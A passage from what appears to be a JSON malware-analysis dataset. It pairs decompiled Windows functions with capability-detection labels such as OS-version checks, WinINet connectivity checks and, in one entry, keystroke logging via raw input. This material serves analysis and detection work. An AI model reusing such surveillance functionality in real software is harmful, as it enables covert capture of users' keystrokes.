        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041d5c2)\n// WARNING: Removing unreachable block (ram,0x0041d5ed)\n// WARNING: Removing unreachable block (ram,0x0041d5f0)\n// WARNING: Removing unreachable block (ram,0x0041d630)\n// WARNING: Removing unreachable block (ram,0x0041d64c)\n// WARNING: Removing unreachable block (ram,0x0041d650)\n// WARNING: Removing unreachable block (ram,0x0041d696)\n// WARNING: Removing unreachable block (ram,0x0041d65f)\n// WARNING: Removing unreachable block (ram,0x0041d6a3)\n\nvoid __fastcall fcn.0041d4a4(int32_t param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack72 = &stack0xfffffffc;\n    uStack76 = 0x41d71d;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    var_1ch = 0;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        fcn.00404df4();\n        puVar1 = puStack72;\n    }\n    puStack72 = puVar1;\n    iVar3 = *(*(in_EAX + 0x14) + 8);\n    if (iVar3 == 0) {\n        fcn.0040c668();\n        fcn.004047cc();\n    }\n    else if (-1 < iVar3 + -1) {\n        do {\n            fcn.0041c994();\n            fcn.00406588();\n            fcn.004065b4();\n            cVar2 = (**(_pe_dos_header + 0x38))();\n            if (cVar2 != '\\0') {\n                var_1ch = var_1ch + 1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    if (var_1ch == 0) {\n        fcn.0040c668();\n        fcn.004047cc();\n    }\n    if (var_1ch == 1) {\n        fcn.0041d410(&stack0xfffffffc);\n    }\n    else if (*(in_EAX + 0xc) == 0) {\n        fcn.0041d410(&stack0xfffffffc);\n    }\n    else {\n        fcn.004065b4();\n        fcn.0041d410(&stack0xfffffffc);\n    }\n    *in_FS_OFFSET = uStack80;\n    puStack72 = 0x41d724;\n    uStack76 = 0x41d6f1;\n    fcn.00406570();\n    uStack76 = 0x41d6f9;\n    fcn.00404da0();\n    uStack76 = 0x41d70c;\n    fcn.0040592c();\n    uStack76 = 0x41d714;\n    fcn.00406570();\n    uStack76 = 0x41d71c;\n    fcn.00406570();\n    return;\n}\n",
        "token_count": 838
    },
    "0041d754": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d754(int32_t param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41d813;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        fcn.00404df4();\n        puVar1 = puStack32;\n    }\n    puStack32 = puVar1;\n    if (*(*(in_EAX + 0x14) + 8) == 0) {\n        fcn.0040c668();\n        fcn.004047cc();\n    }\n    iVar3 = *(*(in_EAX + 0x14) + 8);\n    if (-1 < iVar3 + -1) {\n        do {\n            fcn.0041c994();\n            fcn.00406588();\n            fcn.004065b4();\n            cVar2 = (**(_pe_dos_header + 0x30))();\n            if (cVar2 != '\\0') {\n                (**(_pe_dos_header + 0x34))();\n                break;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41d81a;\n    uStack36 = 0x41d80a;\n    fcn.00406570();\n    uStack36 = 0x41d812;\n    fcn.00406570();\n    return;\n}\n",
        "token_count": 429
    },
    "0041d834": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041d834(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x41d846;\n    fcn.004065e4();\n    uStack20 = 0x41d883;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    if (*(in_EAX + 0xc) != 0) {\n        puStack16 = &stack0xfffffffc;\n        fcn.00406570();\n    }\n    fcn.00406588();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41d88a;\n    uStack20 = 0x41d882;\n    fcn.00406570();\n    return;\n}\n",
        "token_count": 213
    },
    "0041d890": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d890(uint arg_8h, uint arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t in_ECX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x41d8a9;\n    fcn.00405254();\n    uStack28 = 0x41d93a;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    if (in_ECX != 0) {\n        puStack24 = &stack0xfffffffc;\n        fcn.00404df4();\n    }\n    iVar1 = arg_ch;\n    if (iVar1 == 1) {\n        fcn.0041d4a4();\n    }\n    else if (iVar1 == 2) {\n        fcn.0041cf04();\n    }\n    else if (iVar1 == 3) {\n        fcn.0041cf34();\n    }\n    else if (iVar1 == 8) {\n        fcn.0041d4a4();\n    }\n    else {\n        fcn.0041d0d4(arg_8h, arg_ch);\n        in_stack_ffffffd8 = arg_8h;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    uStack32 = 0x41d941;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 354
    },
    "0041d94c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d94c(int32_t param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x41da36;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        fcn.00404df4();\n        puVar1 = puStack40;\n    }\n    puStack40 = puVar1;\n    iVar4 = *(*(in_EAX + 0x10) + 8);\n    if (-1 < iVar4 + -1) {\n        do {\n            fcn.0041c994();\n            fcn.00406588();\n            fcn.00406570();\n            cVar2 = fcn.0040e128();\n            if (cVar2 != '\\0') {\n                (**(_pe_dos_header + 0x40))();\n                (**(_pe_dos_header + 0x44))();\n            }\n            iVar3 = (**(_pe_dos_header + 0x10))();\n            if (cVar2 != '\\0') {\n                (**(_pe_dos_header + 0x44))();\n            }\n        } while ((iVar3 < 1) && (iVar4 = iVar4 + -1,  iVar4 != 0));\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x41da3d;\n    uStack44 = 0x41da2d;\n    fcn.00406570();\n    uStack44 = 0x41da35;\n    fcn.00406570();\n    return;\n}\n",
        "token_count": 460
    },
    "0041db60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041db60(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uchar auStack16 [12];\n    \n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = auStack16;\n    *0x496304 = *0x496304 + 1;\n    if ((*0x496304 == 0) && (*0x496308 != 0)) {\n        *0x496308 = 0;\n    }\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 118
    },
    "0041dba0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041dba0(void)\n\n{\n    uint8_t in_AL;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffd8;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x41dbb6;\n    fcn.00405254();\n    uStack28 = 0x41dc5d;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    if (*(in_AL + 0x496334) == '\\0') {\n        if (*0x496330 == 0) {\n            iVar2 = 0;\n            puStack24 = &stack0xfffffffc;\n        }\n        else {\n            puStack24 = &stack0xfffffffc;\n            if (((in_AL == 0) && (puStack24 = &stack0xfffffffc,  *0x49633c == '\\0')) &&\n               (puStack24 = &stack0xfffffffc,  *0x49631c = fcn.0041dba0(),  *0x49633c == '\\0')) {\n                fcn.00404da0();\n            }\n            uVar1 = fcn.00405264();\n            in_stack_ffffffd8 = *0x496330;\n            iVar2 = sub.kernel32.dll_GetProcAddress_1(*0x496330, uVar1);\n        }\n        if ((iVar2 != 0) && (in_AL != 0)) {\n            *0x49633c = '\\x01';\n        }\n        *(in_AL + 0x496334) = 1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    iStack32 = 0x41dc64;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 433
    },
    "0041dc84": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041dc84(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (*0x496334 == '\\0') {\n        *0x49630c = fcn.0041dba0();\n        (**0x49630c)(arg_8h);\n    }\n    else {\n        iVar1 = -1;\n        if (arg_8h - 0x4cU < 2) {\n            iVar1 = 0;\n        }\n        else if (arg_8h == 0x4e) {\n            arg_8h = 0;\n        }\n        else if (arg_8h == 0x4f) {\n            arg_8h = 1;\n        }\n        else if (arg_8h - 0x50U < 2) {\n            iVar1 = 1;\n        }\n        if (iVar1 == -1) {\n            sub.user32.dll_GetSystemMetrics(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 222
    },
    "0041dd0c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041dd0c(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x496336 == '\\0') {\n        *0x496314 = fcn.0041dba0();\n        uVar1 = (**0x496314)(arg_8h, arg_ch);\n        return uVar1;\n    }\n    if ((arg_ch & 3) == 0) {\n        if (arg_8h[2] < 1) {\n            return 0;\n        }\n        if (arg_8h[3] < 1) {\n            return 0;\n        }\n        iVar2 = (**0x49630c)(0);\n        if (iVar2 <= *arg_8h) {\n            return 0;\n        }\n        iVar2 = (**0x49630c)(1);\n        if (iVar2 <= arg_8h[1]) {\n            return 0;\n        }\n    }\n    return 0x12340042;\n}\n",
        "token_count": 233
    },
    "0041dd9c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041dd9c(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_2ch;\n    uint var_10h;\n    \n    if (*0x496335 == '\\0') {\n        *0x496310 = fcn.0041dba0();\n        uVar1 = (**0x496310)(arg_8h, arg_ch);\n    }\n    else if ((arg_ch & 3) == 0) {\n        iVar2 = sub.user32.dll_IsIconic(arg_8h);\n        if (iVar2 == 0) {\n            sub.user32.dll_GetWindowRect(arg_8h, &var_10h);\n        }\n        else {\n            sub.user32.dll_GetWindowPlacement(arg_8h, &var_2ch);\n        }\n        uVar1 = fcn.0041dd0c(&var_10h, arg_ch);\n    }\n    else {\n        uVar1 = 0x12340042;\n    }\n    return uVar1;\n}\n",
        "token_count": 235
    },
    "0041de34": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041de34(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x496337 == '\\0') {\n        *0x496318 = fcn.0041dba0();\n        uVar1 = (**0x496318)(arg_8h, arg_ch, arg_10h);\n        return uVar1;\n    }\n    if ((arg_10h & 3) == 0) {\n        if (arg_8h < 0) {\n            return 0;\n        }\n        iVar2 = (**0x49630c)(0);\n        if (iVar2 <= arg_8h) {\n            return 0;\n        }\n        if (arg_ch < 0) {\n            return 0;\n        }\n        iVar2 = (**0x49630c)(1);\n        if (iVar2 <= arg_ch) {\n            return 0;\n        }\n    }\n    return 0x12340042;\n}\n",
        "token_count": 233
    },
    "0041decc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041decc(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x496338 == '\\0') {\n        *0x49631c = fcn.0041dba0();\n        uVar1 = (**0x49631c)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x49630c)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x49630c)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x47 < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x41df98);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 396
    },
    "0041dfa0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041dfa0(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x496339 == '\\0') {\n        *0x496320 = fcn.0041dba0();\n        uVar1 = (**0x496320)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x49630c)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x49630c)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x47 < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x41e06c);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 395
    },
    "0041e074": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041e074(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x49633a == '\\0') {\n        *0x496324 = fcn.0041dba0();\n        uVar1 = (**0x496324)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x49630c)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x49630c)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x47 < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x41e140);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 395
    },
    "0041e148": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041e148(int32_t arg_8h, int32_t arg_ch, code *arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*0x49633b == '\\0') {\n        *0x496328 = fcn.0041dba0();\n        uVar1 = (**0x496328)(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    else {\n        uVar1 = 0;\n        if (arg_10h != NULL) {\n            var_1ch = 0;\n            var_18h = 0;\n            var_14h = (**0x49630c)(0);\n            var_10h = (**0x49630c)(1);\n            if (arg_8h == 0) {\n                if ((arg_ch != 0) && (iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, arg_ch),  iVar2 == 0)) {\n                    return 1;\n                }\n            }\n            else {\n                var_ch = sub.gdi32.dll_GetClipBox(arg_8h, &var_2ch);\n                iVar2 = sub.gdi32.dll_GetDCOrgEx(arg_8h, &var_8h);\n                if (iVar2 == 0) {\n                    return 0;\n                }\n                sub.user32.dll_OffsetRect(&var_1ch, -var_8h, -var_4h);\n                iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, &var_2ch);\n                if (((iVar2 == 0) || (arg_ch != 0)) &&\n                   (iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, arg_ch),  iVar2 == 0)) {\n                    if (var_ch != 1) {\n                        return 0;\n                    }\n                    return 1;\n                }\n            }\n            uVar1 = (*arg_10h)(0x12340042, arg_8h, &var_1ch, arg_14h);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 551
    },
    "0041e908": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0041e908(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (in_EAX == 1) {\n        return 1;\n    }\n    if (in_EAX == 2) {\n        uVar1 = 2;\n    }\n    else if (in_EAX == 4) {\n        uVar1 = 3;\n    }\n    else if (in_EAX == 3) {\n        uVar1 = 4;\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 130
    },
    "0041e9a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041e9a0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 4) != 0) {\n        if (*(in_EAX + 0xc) == '\\0') {\n            sub.advapi32.dll_RegFlushKey(*(in_EAX + 4));\n        }\n        sub.advapi32.dll_RegCloseKey_1(*(in_EAX + 4));\n        *(in_EAX + 4) = 0;\n        fcn.00404da0();\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "0041e9d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e9d0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_2 != *(in_EAX + 8)) {\n        if (*(in_EAX + 0x14) != '\\0') {\n            sub.advapi32.dll_RegCloseKey_1(*(in_EAX + 8));\n            *(in_EAX + 0x14) = 0;\n        }\n        *(in_EAX + 8) = param_2;\n        fcn.0041e9a0();\n    }\n    return;\n}\n",
        "token_count": 135
    },
    "0041ea34": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041ea34(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff94;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack32 = 0x41ebce;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    fcn.00404e38();\n    uVar1 = fcn.0041e8f4();\n    if (uVar1 == 0) {\n        fcn.00405304();\n    }\n    var_ch = 0;\n    uVar2 = fcn.00405264(0, 0x20019, &var_ch);\n    uVar2 = fcn.0041ea20(uVar2);\n    iVar3 = sub.advapi32.dll_RegOpenKeyExA_1(uVar2);\n    var_5h = iVar3 == 0;\n    if (var_5h) {\n        *(in_EAX + 0x18) = 0x20019;\n        if ((*(in_EAX + 4) != 0 & uVar1) != 0) {\n            fcn.00405124(var_4h, 0x41ebe8, *(in_EAX + 0x10));\n        }\n        fcn.0041e9fc();\n    }\n    else {\n        uVar2 = fcn.00405264(0, 0x20009, &var_ch);\n        uVar2 = fcn.0041ea20(uVar2);\n        iVar3 = sub.advapi32.dll_RegOpenKeyExA_1(uVar2);\n        var_5h = iVar3 == 0;\n        if (var_5h) {\n            *(in_EAX + 0x18) = 0x20009;\n            if ((*(in_EAX + 4) != 0 & uVar1) != 0) {\n                fcn.00405124(var_4h, 0x41ebe8, *(in_EAX + 0x10));\n            }\n            fcn.0041e9fc();\n        }\n        else {\n            uVar2 = fcn.00405264(0, 1, &var_ch);\n            uVar2 = fcn.0041ea20(uVar2);\n            iVar3 = sub.advapi32.dll_RegOpenKeyExA_1(uVar2);\n            var_5h = iVar3 == 0;\n            if (var_5h) {\n                *(in_EAX + 0x18) = 1;\n                if ((*(in_EAX + 4) != 0 & uVar1) != 0) {\n                    in_stack_ffffff94 = var_4h;\n                    fcn.00405124(var_4h, 0x41ebe8, *(in_EAX + 0x10));\n                }\n                fcn.0041e9fc();\n            }\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffff94;\n    fcn.00404da0(0x41ebd5);\n    return;\n}\n",
        "token_count": 749
    },
    "0041ec64": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid fcn.0041ec64(void)\n\n{\n    int32_t arg_ch;\n    uchar *arg_8h;\n    uchar auStack20 [4];\n    \n    arg_8h = auStack20;\n    arg_ch = fcn.0041ec3c();\n    if (arg_ch < 1) {\n        fcn.00404da0();\n    }\n    else {\n        fcn.00404e90();\n        fcn.00405264();\n        fcn.0041ecdc(arg_8h, arg_ch);\n        if ((arg_8h == '\\x01') || (arg_8h == '\\x02')) {\n            fcn.00405264();\n            fcn.00409568();\n            fcn.004054ec();\n        }\n        else {\n            fcn.0041e8c8();\n        }\n    }\n    return;\n}\n",
        "token_count": 188
    },
    "0041ff50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041ff50(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x41ff6b;\n    iVar2 = fcn.0041fec4();\n    puStack24 = 0x41ff75;\n    fcn.0041ff38();\n    uStack28 = 0x420024;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    for (var_8h = *(in_EAX + 4); var_8h != NULL; var_8h = *var_8h) {\n        if (iVar2 == *(var_8h + 3)) {\n            cVar1 = fcn.00408a2c();\n            if (cVar1 != '\\0') break;\n        }\n    }\n    if (var_8h == NULL) {\n        var_8h = fcn.00402ce4();\n        *var_8h = *(in_EAX + 4);\n        var_8h[1] = 0;\n        var_8h[2] = *param_2;\n        *(var_8h + 3) = iVar2;\n        fcn.00402ee0();\n        *(in_EAX + 4) = var_8h;\n    }\n    var_8h[1] = var_8h[1] + 1;\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x42002b;\n    uStack28 = 0x420023;\n    fcn.0041ff44();\n    return;\n}\n",
        "token_count": 430
    },
    "00420034": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
